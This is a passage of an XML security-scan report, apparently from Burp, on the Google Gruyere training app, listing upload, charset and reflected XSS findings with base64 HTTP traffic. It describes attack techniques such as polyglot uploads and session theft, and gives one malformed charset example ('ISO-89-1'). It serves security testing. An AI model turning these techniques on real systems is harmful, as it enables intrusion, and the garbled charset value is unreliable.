HQ7CiAgbWFyZ2luOiBhdXRvOwogIHBhZGRpbmctdG9wOiAwOwogIHBhZGRpbmctYm90dG9tOiAycHQ7CiAgbWFyZ2luLXRvcDogMDsKICBtYXJnaW4tYm90dG9tOiAwOwp9CgouaDItd2l0aC1yZWZyZXNoIHsKICBtYXJnaW4tYm90dG9tOiAwOwp9Cgo8L3N0eWxlPgoKPC9oZWFkPgoKPGJvZHk+Cgo8ZGl2IGNsYXNzPSdtZW51Jz4KICA8c3BhbiBpZD0nbWVudS1sZWZ0Jz4KICAgIDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvJz5Ib21lPC9hPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NuaXBwZXRzLmd0bCc+TXkmbmJzcDtTbmlwcGV0czwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L25ld3NuaXBwZXQuZ3RsJz5OZXcmbmJzcDtTbmlwcGV0PC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkLmd0bCc+VXBsb2FkPC9hPgogICAgICAKICA8L3NwYW4+CiAgPHNwYW4gaWQ9J21lbnUtcmlnaHQnPgogICAgICAKICAgICAgPHNwYW4gY2xhc3M9J21lbnUtdXNlcic+CiAgICAgICAgNTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tICZsdDs1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20mZ3Q7CiAgICAgIDwvc3Bhbj4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9lZGl0cHJvZmlsZS5ndGwnPlByb2ZpbGU8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9sb2dvdXQnPlNpZ24gb3V0PC9hPgogICAgICAKICAgICAgCiAgPC9zcGFuPgo8L2Rpdj4KCjxoMj5HcnV5ZXJlOiBVcGxvYWQ8L2gyPgoKPGRpdiBjbGFzcz0nY29udGVudCc+CjxoMz5TZWxlY3QgYSBmaWxlIHRvIHVwbG9hZCB0byB5b3VyIGFjY291bnQuPC9oMz4KCgoKPGRpdj4KPGZvcm0gbWV0aG9kPSdwb3N0JyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJyBhY3Rpb249Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkMic+Cjx0YWJsZT4KPHRyPjx0ZD4KICAgIDxpbnB1dCB0eXBlPSdmaWxlJyBuYW1lPSd1cGxvYWRfZmlsZScgc2l6ZT0nNTAnPgo8L3RkPjwvdHI+Cjx0cj48dGQgYWxpZ249J2NlbnRlcic+CiAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nVXBsb2FkJz4KPC90ZD48L3RyPgo8L3RhYmxlPgo8L2Zvcm0+CjwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1827928909402902528</serialNumber>
    <type>5245312</type>
    <name><![CDATA[File upload functionality]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/upload.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/upload.gtl]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>File upload functionality is commonly associated with a number of vulnerabilities, including:</p>
<ul>
<li>File path traversal</li><li>Persistent cross-site scripting</li><li>Placing of other client-executable code into the domain</li><li>Transmission of viruses and other malware</li><li>Denial of service</li></ul>
<p>You should review file upload functionality to understand its purpose, and establish whether uploaded content is ever returned to other application users, either through their normal usage of the application or by being fed a specific link by an attacker.</p>
<p>Some factors to consider when evaluating the security impact of this functionality include:</p>
<ul>
<li>Whether uploaded content can subsequently be downloaded via a URL within the application.</li><li>What Content-type and Content-disposition headers the application returns when the file's content is downloaded.</li><li>Whether it is possible to place executable HTML/JavaScript into the file, which executes when the file's contents are viewed.</li><li>Whether the application performs any filtering on the file extension or MIME type of the uploaded file.</li><li>Whether it is possible to construct a hybrid file containing both executable and non-executable content, to bypass any content filters - for example, a file containing both a GIF image and a Java archive (known as a GIFAR file).</li><li>What location is used to store uploaded content, and whether it is possible to supply a crafted filename to escape from this location.</li><li>Whether archive formats such as ZIP are unpacked by the application.</li><li>How the application handles attempts to upload very large files, or decompression bomb files.</li></ul>]]></issueBackground>
    <remediationBackground><![CDATA[<p>File upload functionality is not straightforward to implement securely. Some recommendations to consider in the design of this functionality include:</p>
<ul>
<li>Use a server-generated filename if storing uploaded files on disk.</li><li>Inspect the content of uploaded files, and enforce a whitelist of accepted, non-executable content types. Additionally, enforce a blacklist of common executable formats, to hinder hybrid file attacks.</li><li>Enforce a whitelist of accepted, non-executable file extensions.</li>
<li>If uploaded files are downloaded by users, supply an accurate non-generic Content-Type header, the X-Content-Type-Options: nosniff header, and also a Content-Disposition header that specifies that browsers should handle the file as an attachment.</li>
<li>Enforce a size limit on uploaded files (for defense-in-depth, this can be implemented both within application code and in the web server's configuration).</li><li>Reject attempts to upload archive formats such as ZIP.</li></ul>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://github.com/cure53/H5SC/tree/master/attachments">Various proof-of-concept files</a></li>
<li><a href="http://labs.detectify.com/post/120088174539/building-an-xss-polyglot-through-swf-and-csp">An XSS polyglot attack</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/434.html">CWE-434: Unrestricted Upload of File with Dangerous Type</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The page contains a form which is used to submit a user-supplied file to the following URL:<ul><li>http://google-gruyere.appspot.com/421683968655469260586300829583795792326/upload2</li></ul>Note that Burp has not identified any specific security vulnerabilities with this functionality, and you should manually review it to determine whether any problems exist.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkLmd0bCBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogZDVkY2EzNjg5YTRlMDUwOWJlYjRhN2Q0OGZmNzE3ZjU7bz0xDQpWYXJ5OiBBY2NlcHQtRW5jb2RpbmcNCkRhdGU6IFRodSwgMTggSmFuIDIwMTggMDk6NDI6MDkgR01UDQpTZXJ2ZXI6IEdvb2dsZSBGcm9udGVuZA0KQ29udGVudC1MZW5ndGg6IDI5NzINCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhRE9DVFlQRSBIVE1MIFBVQkxJQyAiLS8vVzNDLy9EVEQgSFRNTCA0LjAxIFRyYW5zaXRpb25hbC8vRU4iPgo8IS0tIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuIC0tPgo8aHRtbD4KPGhlYWQ+Cjx0aXRsZT5HcnV5ZXJlOiBVcGxvYWQ8L3RpdGxlPgo8c3R5bGU+Ci8qIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuICovCgpib2R5LCBodG1sLCB0ZCwgc3BhbiwgZGl2LCBpbnB1dCwgdGV4dGFyZWEgewogIGZvbnQtZmFtaWx5OiBzYW5zLXNlcmlmOwogIGZvbnQtc2l6ZTogMTRwdDsKfQoKYm9keSB7CiAgYmFja2dyb3VuZDogdXJsKCdjaGVlc2UucG5nJykgdG9wIGNlbnRlciByZXBlYXQ7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIG9wYWNpdHk6IDAuODA7Cn0KCmgyIHsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgZm9udC1zaXplOiAzMHB0OwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9Cgp0ZCB7CiAgdmVydGljYWwtYWxpZ246IHRvcDsKICBwYWRkaW5nOiA1cHg7Cn0KCmEsIGE6aG92ZXIgewogIHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOwogIGNvbG9yOiAjMDAwMGJiOwp9CgphOnZpc2l0ZWQgewogIGNvbG9yOiAjYmIwMDAwOwp9CgphLmJ1dHRvbjp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDBiYjsKfQoKLmNvbnRlbnQgewogIHRleHQtYWxpZ246IGxlZnQ7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBwYWRkaW5nOiAyMHB4OwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIHBhZGRpbmc6IDEwcHggMjBweCAzNXB4IDIwcHg7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgd2lkdGg6IDkwJTsKICBiYWNrZ3JvdW5kOiAjZmZmZmNjOwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51LXVzZXIgewogIGNvbG9yOiAjMDAwMDAwOwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9CgojbWVudS1sZWZ0IHsKICBmbG9hdDogbGVmdDsKfQoKI21lbnUtbGVmdCBhLCAjbWVudS1sZWZ0IGE6aG92ZXIsICNtZW51LWxlZnQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKI21lbnUtcmlnaHQgewogIGZsb2F0OiByaWdodDsKfQoKI21lbnUtcmlnaHQgYSwgI21lbnUtcmlnaHQgYTpob3ZlciwgI21lbnUtcmlnaHQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKLm1lc3NhZ2UgewogIHdpZHRoOiA1MCU7CiAgY29sb3I6ICNmZjAwMDA7CiAgYmFja2dyb3VuZDogI2ZmZGRkZDsKICBib3JkZXI6IDJweCBzb2xpZCAjZmYwMDAwOwogIGJvcmRlci1yYWRpdXM6IDFlbTsKICAtbW96LWJvcmRlci1yYWRpdXM6IDFlbTsKICBwYWRkaW5nOiAxMHB4OwogIGZvbnQtd2VpZ2h0OiBib2xkOwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBtYXJnaW46IGF1dG87CiAgbWFyZ2luLXRvcDogMjBweDsKICBtYXJnaW4tYm90dG9tOiAyMHB4Owp9CgppbnB1dCwgdGV4dGFyZWEgewogIGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7Cn0KCi5yZWZyZXNoIHsKICBmbG9hdDogY2VudGVyOwogIHdpZHRoOiA5MCU7CiAgdGV4dC1hbGlnbjogcmlnaHQ7CiAgbWFyZ2luOiBhdXRvOwogIHBhZGRpbmctdG9wOiAwOwogIHBhZGRpbmctYm90dG9tOiAycHQ7CiAgbWFyZ2luLXRvcDogMDsKICBtYXJnaW4tYm90dG9tOiAwOwp9CgouaDItd2l0aC1yZWZyZXNoIHsKICBtYXJnaW4tYm90dG9tOiAwOwp9Cgo8L3N0eWxlPgoKPC9oZWFkPgoKPGJvZHk+Cgo8ZGl2IGNsYXNzPSdtZW51Jz4KICA8c3BhbiBpZD0nbWVudS1sZWZ0Jz4KICAgIDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvJz5Ib21lPC9hPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NuaXBwZXRzLmd0bCc+TXkmbmJzcDtTbmlwcGV0czwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L25ld3NuaXBwZXQuZ3RsJz5OZXcmbmJzcDtTbmlwcGV0PC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkLmd0bCc+VXBsb2FkPC9hPgogICAgICAKICA8L3NwYW4+CiAgPHNwYW4gaWQ9J21lbnUtcmlnaHQnPgogICAgICAKICAgICAgPHNwYW4gY2xhc3M9J21lbnUtdXNlcic+CiAgICAgICAgNTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tICZsdDs1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20mZ3Q7CiAgICAgIDwvc3Bhbj4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9lZGl0cHJvZmlsZS5ndGwnPlByb2ZpbGU8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9sb2dvdXQnPlNpZ24gb3V0PC9hPgogICAgICAKICAgICAgCiAgPC9zcGFuPgo8L2Rpdj4KCjxoMj5HcnV5ZXJlOiBVcGxvYWQ8L2gyPgoKPGRpdiBjbGFzcz0nY29udGVudCc+CjxoMz5TZWxlY3QgYSBmaWxlIHRvIHVwbG9hZCB0byB5b3VyIGFjY291bnQuPC9oMz4KCgoKPGRpdj4KPGZvcm0gbWV0aG9kPSdwb3N0JyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJyBhY3Rpb249Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkMic+Cjx0YWJsZT4KPHRyPjx0ZD4KICAgIDxpbnB1dCB0eXBlPSdmaWxlJyBuYW1lPSd1cGxvYWRfZmlsZScgc2l6ZT0nNTAnPgo8L3RkPjwvdHI+Cjx0cj48dGQgYWxpZ249J2NlbnRlcic+CiAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nVXBsb2FkJz4KPC90ZD48L3RyPgo8L3RhYmxlPgo8L2Zvcm0+CjwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3149049066788608000</serialNumber>
    <type>8389120</type>
    <name><![CDATA[HTML does not specify charset]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/upload.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/upload.gtl]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>If a  response states that it contains HTML content but does not specify a character set, then the browser may analyze the HTML and attempt to determine which character set it appears to be using. Even if the majority of the HTML actually employs a standard character set such as UTF-8, the presence of non-standard characters anywhere in the response may cause the browser to interpret the content using a different character set. This can have unexpected results, and can lead to cross-site scripting vulnerabilities in which non-standard encodings like UTF-7 can be used to bypass the application's defensive filters.</p>
<p>In most cases, the absence of a charset directive does not constitute a security flaw, particularly if the response contains static content. You should review the contents of affected responses, and the context in which they appear, to determine whether any vulnerability exists. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>For every response containing HTML content, the application should include within the Content-type header a directive specifying a standard recognized character set, for example <b>charset=ISO-89-1</b>.
</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/436.html">CWE-436: Interpretation Conflict</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkLmd0bCBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogZDVkY2EzNjg5YTRlMDUwOWJlYjRhN2Q0OGZmNzE3ZjU7bz0xDQpWYXJ5OiBBY2NlcHQtRW5jb2RpbmcNCkRhdGU6IFRodSwgMTggSmFuIDIwMTggMDk6NDI6MDkgR01UDQpTZXJ2ZXI6IEdvb2dsZSBGcm9udGVuZA0KQ29udGVudC1MZW5ndGg6IDI5NzINCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhRE9DVFlQRSBIVE1MIFBVQkxJQyAiLS8vVzNDLy9EVEQgSFRNTCA0LjAxIFRyYW5zaXRpb25hbC8vRU4iPgo8IS0tIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuIC0tPgo8aHRtbD4KPGhlYWQ+Cjx0aXRsZT5HcnV5ZXJlOiBVcGxvYWQ8L3RpdGxlPgo8c3R5bGU+Ci8qIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuICovCgpib2R5LCBodG1sLCB0ZCwgc3BhbiwgZGl2LCBpbnB1dCwgdGV4dGFyZWEgewogIGZvbnQtZmFtaWx5OiBzYW5zLXNlcmlmOwogIGZvbnQtc2l6ZTogMTRwdDsKfQoKYm9keSB7CiAgYmFja2dyb3VuZDogdXJsKCdjaGVlc2UucG5nJykgdG9wIGNlbnRlciByZXBlYXQ7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIG9wYWNpdHk6IDAuODA7Cn0KCmgyIHsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgZm9udC1zaXplOiAzMHB0OwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9Cgp0ZCB7CiAgdmVydGljYWwtYWxpZ246IHRvcDsKICBwYWRkaW5nOiA1cHg7Cn0KCmEsIGE6aG92ZXIgewogIHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOwogIGNvbG9yOiAjMDAwMGJiOwp9CgphOnZpc2l0ZWQgewogIGNvbG9yOiAjYmIwMDAwOwp9CgphLmJ1dHRvbjp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDBiYjsKfQoKLmNvbnRlbnQgewogIHRleHQtYWxpZ246IGxlZnQ7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBwYWRkaW5nOiAyMHB4OwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIHBhZGRpbmc6IDEwcHggMjBweCAzNXB4IDIwcHg7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgd2lkdGg6IDkwJTsKICBiYWNrZ3JvdW5kOiAjZmZmZmNjOwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51LXVzZXIgewogIGNvbG9yOiAjMDAwMDAwOwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9CgojbWVudS1sZWZ0IHsKICBmbG9hdDogbGVmdDsKfQoKI21lbnUtbGVmdCBhLCAjbWVudS1sZWZ0IGE6aG92ZXIsICNtZW51LWxlZnQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKI21lbnUtcmlnaHQgewogIGZsb2F0OiByaWdodDsKfQoKI21lbnUtcmlnaHQgYSwgI21lbnUtcmlnaHQgYTpob3ZlciwgI21lbnUtcmlnaHQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKLm1lc3NhZ2UgewogIHdpZHRoOiA1MCU7CiAgY29sb3I6ICNmZjAwMDA7CiAgYmFja2dyb3VuZDogI2ZmZGRkZDsKICBib3JkZXI6IDJweCBzb2xpZCAjZmYwMDAwOwogIGJvcmRlci1yYWRpdXM6IDFlbTsKICAtbW96LWJvcmRlci1yYWRpdXM6IDFlbTsKICBwYWRkaW5nOiAxMHB4OwogIGZvbnQtd2VpZ2h0OiBib2xkOwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBtYXJnaW46IGF1dG87CiAgbWFyZ2luLXRvcDogMjBweDsKICBtYXJnaW4tYm90dG9tOiAyMHB4Owp9CgppbnB1dCwgdGV4dGFyZWEgewogIGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7Cn0KCi5yZWZyZXNoIHsKICBmbG9hdDogY2VudGVyOwogIHdpZHRoOiA5MCU7CiAgdGV4dC1hbGlnbjogcmlnaHQ7CiAgbWFyZ2luOiBhdXRvOwogIHBhZGRpbmctdG9wOiAwOwogIHBhZGRpbmctYm90dG9tOiAycHQ7CiAgbWFyZ2luLXRvcDogMDsKICBtYXJnaW4tYm90dG9tOiAwOwp9CgouaDItd2l0aC1yZWZyZXNoIHsKICBtYXJnaW4tYm90dG9tOiAwOwp9Cgo8L3N0eWxlPgoKPC9oZWFkPgoKPGJvZHk+Cgo8ZGl2IGNsYXNzPSdtZW51Jz4KICA8c3BhbiBpZD0nbWVudS1sZWZ0Jz4KICAgIDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvJz5Ib21lPC9hPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NuaXBwZXRzLmd0bCc+TXkmbmJzcDtTbmlwcGV0czwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L25ld3NuaXBwZXQuZ3RsJz5OZXcmbmJzcDtTbmlwcGV0PC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkLmd0bCc+VXBsb2FkPC9hPgogICAgICAKICA8L3NwYW4+CiAgPHNwYW4gaWQ9J21lbnUtcmlnaHQnPgogICAgICAKICAgICAgPHNwYW4gY2xhc3M9J21lbnUtdXNlcic+CiAgICAgICAgNTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tICZsdDs1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20mZ3Q7CiAgICAgIDwvc3Bhbj4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9lZGl0cHJvZmlsZS5ndGwnPlByb2ZpbGU8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9sb2dvdXQnPlNpZ24gb3V0PC9hPgogICAgICAKICAgICAgCiAgPC9zcGFuPgo8L2Rpdj4KCjxoMj5HcnV5ZXJlOiBVcGxvYWQ8L2gyPgoKPGRpdiBjbGFzcz0nY29udGVudCc+CjxoMz5TZWxlY3QgYSBmaWxlIHRvIHVwbG9hZCB0byB5b3VyIGFjY291bnQuPC9oMz4KCgoKPGRpdj4KPGZvcm0gbWV0aG9kPSdwb3N0JyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJyBhY3Rpb249Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkMic+Cjx0YWJsZT4KPHRyPjx0ZD4KICAgIDxpbnB1dCB0eXBlPSdmaWxlJyBuYW1lPSd1cGxvYWRfZmlsZScgc2l6ZT0nNTAnPgo8L3RkPjwvdHI+Cjx0cj48dGQgYWxpZ249J2NlbnRlcic+CiAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nVXBsb2FkJz4KPC90ZD48L3RyPgo8L3RhYmxlPgo8L2Zvcm0+CjwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7180203409646145536</serialNumber>
    <type>2097920</type>
    <name><![CDATA[Cross-site scripting (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/upload.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/upload.gtl [URL path filename]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html">Using Burp to Find XSS issues</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
</ul>]]></vulnerabilityClassifications>
